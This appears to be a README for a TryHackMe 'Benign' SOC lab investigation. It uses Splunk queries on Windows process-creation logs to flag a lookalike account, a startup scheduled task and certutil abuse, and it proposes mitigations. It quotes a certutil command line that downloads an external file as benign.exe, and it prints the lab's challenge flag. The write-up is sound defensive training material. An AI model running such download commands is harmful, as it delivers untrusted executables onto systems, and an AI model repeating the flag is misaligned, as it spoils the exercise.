# TryHackMe – Benign | SOC Level 1 Investigation

## 📌 Overview

This project documents a Security Operations Center (SOC) investigation using Splunk and Windows Event Logs in the TryHackMe **Benign** room.

The investigation focuses on identifying suspicious account activity, investigating scheduled-task creation, and detecting potential abuse of a legitimate Windows utility (`certutil.exe`) to download a file from an external hosting service.

**Platform:** TryHackMe  
**Room:** Benign  
**Category:** SOC Analysis | SIEM | Windows Event Logs | LOLBIN Detection  
**SIEM:** Splunk Enterprise 8.2.6  
**Data Source:** Windows process-creation logs  
**Primary Event ID:** 4688

## 🎯 Objectives

- Analyse Windows event logs using Splunk Search Processing Language (SPL).
- Identify the total number of ingested events.
- Investigate suspicious or lookalike usernames.
- Examine scheduled-task creation using `schtasks.exe`.
- Detect potential LOLBIN abuse involving `certutil.exe`.
- Extract indicators of compromise (IOCs).
- Reconstruct the suspicious activity and recommend mitigations.

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| Splunk Enterprise 8.2.6 | Searching and analysing Windows event logs |
| Windows Event ID 4688 | Investigating process-creation activity |
| SPL | Filtering and correlating events |
| Browser | Reviewing the external URL shown in the lab evidence |
| TryHackMe | Controlled SOC investigation environment |

---

## 🔍 Investigation Findings

### 1. Log Ingestion Analysis

The initial Splunk query was:

```spl
index=win_eventlogs
| stats count
```

**Observed result:** 13,959 events.

This established the volume of events available in the `win_eventlogs` index for the March 2022 dataset.

### 2. Username Analysis

The following query was used to identify frequently occurring usernames:

```spl
index=win_eventlogs UserName=*
| top limit=20 UserName
```

The investigation identified `Amel1a`, a username visually similar to `Amelia`.

**SOC interpretation:** Lookalike usernames can indicate possible impersonation or account confusion. The username alone does not prove malicious activity, so account creation and authentication logs should be reviewed.

### 3. Suspicious Scheduled-Task Activity

The investigation identified a process-creation event involving `schtasks.exe` associated with user `Chris.fort`.

The command line showed the creation of an `OfficeUpdater` scheduled task referencing:

```text
C:\Users\Chris.fort\AppData\Local\Temp\update.exe
```

The task was configured to run at system startup.

**Why this matters:**

- Scheduled tasks can be used for legitimate administration.
- An executable launched from a user-writable Temp directory is suspicious in this context.
- Startup execution may provide persistence if the task is unauthorized.

The evidence supports investigating the task, but does not independently prove that `update.exe` executed successfully.

### 4. LOLBIN Detection — certutil.exe

The following query was used to investigate the suspicious user:

```spl
index=win_eventlogs schtasks.exe UserName="Chris.fort"
```

A separate search identified the use of `certutil.exe` by user `haroon` on host `HR_01`.

The recorded command line was:

```text
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

**Observed details:**

| Attribute | Value |
|---|---|
| Host | `HR_01` |
| User | `haroon` |
| Process | `certutil.exe` |
| Event ID | `4688` |
| Timestamp | `2022-03-04 10:38:28` |
| Destination URL | `https://controlc.com/e4d11035` |
| Output filename | `benign.exe` |

`certutil.exe` is a legitimate Windows utility that can be abused to download content. Its use to retrieve an external file and save it under an executable filename is suspicious and warrants further investigation.

**Important:** Event ID 4688 confirms process creation and provides the command line. It does not alone confirm successful download, file execution, or command-and-control communication.

### 5. External Content Investigation

The destination URL was reviewed as part of the lab investigation. The supplied screenshot showed the following challenge string:

```text
THM{KJ&*H^B0}
```

This is a challenge artifact associated with the investigation. It is not a file hash or a verified malware-family identifier.

---

## 🚩 Indicators of Compromise and Artifacts

| Type | Value |
|---|---|
| Host | `HR_01` |
| User | `haroon` |
| Suspicious account indicator | `Amel1a` |
| Related user | `Chris.fort` |
| Process | `certutil.exe` |
| Scheduled task | `OfficeUpdater` |
| Referenced executable | `update.exe` |
| Downloaded filename | `benign.exe` |
| URL | `https://controlc.com/e4d11035` |
| Event ID | `4688` |

These indicators are drawn from the supplied lab evidence. A SHA-256 hash for `benign.exe` was not available in the screenshots, so it is not reported here.

## 🧪 SPL Queries

### Count events

```spl
index=win_eventlogs
| stats count
```

### List frequently occurring usernames

```spl
index=win_eventlogs UserName=*
| top limit=20 UserName
```

### Investigate scheduled-task activity

```spl
index=win_eventlogs schtasks.exe UserName="Chris.fort"
```

### Search for certutil process execution

```spl
index=win_eventlogs EventID=4688 certutil.exe
```

### Search for the suspicious URL

```spl
index=win_eventlogs "controlc.com/e4d11035"
```

### Pivot on the affected host and user

```spl
index=win_eventlogs HostName="HR_01" UserName="haroon"
```

*Note: Field names and filters may need adjustment depending on the event format and Splunk field extractions.*

---

## 🧩 Attack Reconstruction

Based on the supplied evidence, the likely sequence is:

1. **Account investigation:** The analyst identified a username that resembles another account name.
2. **Scheduled-task investigation:** A scheduled task named `OfficeUpdater` was configured to launch `update.exe` from a user Temp directory at startup.
3. **Suspicious download:** The `certutil.exe` utility was used to retrieve external content from ControlC and save it as `benign.exe`.
4. **IOC collection:** The analyst documented the suspicious URL, filenames, usernames, host, and process command line.
5. **Further validation required:** File execution, persistence, lateral movement, and command-and-control activity would need corroborating telemetry.

The scheduled-task activity and the certutil download are suspicious findings, but the available evidence does not establish that they were part of one confirmed attack chain.

## 🛡️ Mitigation and Recommendations

- **Investigate the endpoint:** Review process, file, network, and authentication logs for `HR_01`.
- **Analyse downloaded files safely:** Locate `benign.exe`, calculate its SHA-256 hash, inspect its file type, and analyse it only in an isolated environment.
- **Validate scheduled tasks:** Inspect the `OfficeUpdater` task, its creation history, the executable path, and any subsequent process executions.
- **Detect LOLBIN abuse:** Monitor `certutil.exe` command lines containing URL-cache options and unusual external destinations.
- **Restrict network egress:** Apply appropriate outbound network controls and investigate connections to suspicious hosting services.
- **Investigate account anomalies:** Validate `Amel1a` against identity records and review relevant account-creation and authentication events.
- **Improve logging:** Enable process command-line auditing and centralise Windows security logs in the SIEM.
- **Contain confirmed compromise:** If corroborating evidence establishes malicious activity, isolate the endpoint, preserve evidence, remove confirmed malicious artifacts, and reset affected credentials where justified.

## 🧠 Key Learnings

- Splunk can help analysts investigate suspicious activity across Windows event logs.
- Event ID 4688 provides useful process-creation and command-line evidence.
- Legitimate system utilities can be abused as living-off-the-land binaries (LOLBINs).
- Scheduled-task creation can be relevant to persistence investigations.
- A suspicious command line is an indicator, not proof of successful execution.
- SOC conclusions should be based on evidence and corroborated with additional telemetry.

## 📸 Evidence and Report

The accompanying investigation report includes the supplied screenshots, findings, evidence references, SPL queries, attack reconstruction, and mitigation recommendations.

**[Download the Benign SOC Investigation Report (PDF)](sandbox:/mnt/data/TryHackMe_Benign_SOC_Investigation_Report.pdf)**

Suggested GitHub structure:

```text
TryHackMe-Benign/
├── README.md
├── screenshots/
│   ├── 01-event-count.png
│   ├── 02-username-analysis.png
│   ├── 03-scheduled-task-event.png
│   ├── 04-certutil-download.png
│   ├── 05-external-content.png
│   └── 06-room-completion.png
└── report/
    └── TryHackMe_Benign_SOC_Investigation_Report.pdf
```

Upload your actual screenshots and PDF to the repository before linking to them from GitHub.

## 🔗 References

- [TryHackMe — Benign](https://tryhackme.com/room/benign)
- [Benign Walkthrough — ReadMedium](https://readmedium.com/benign-tryhackme-walkthrough-ff5ca45ec7ae)
- [Benign Room Walkthrough — Anir0y](https://classroom.anir0y.in/post/benign/)
- [Benign Walkthrough — Jan Alhorn](https://blog.janalhorn.de/tryhackme-benign-walkthrough/)

## ✅ Conclusion

The Benign investigation demonstrates how a SOC analyst can use Splunk and Windows process-creation logs to identify suspicious scheduled-task configuration and potential LOLBIN abuse.

The strongest observed indicator is the use of `certutil.exe` to retrieve external content and save it as `benign.exe`. The next step in a real incident would be to correlate this activity with endpoint, file, network, and persistence telemetry to determine whether compromise occurred.

**Disclaimer:** This project is for educational and defensive cybersecurity purposes. Perform investigations only in authorised lab environments.
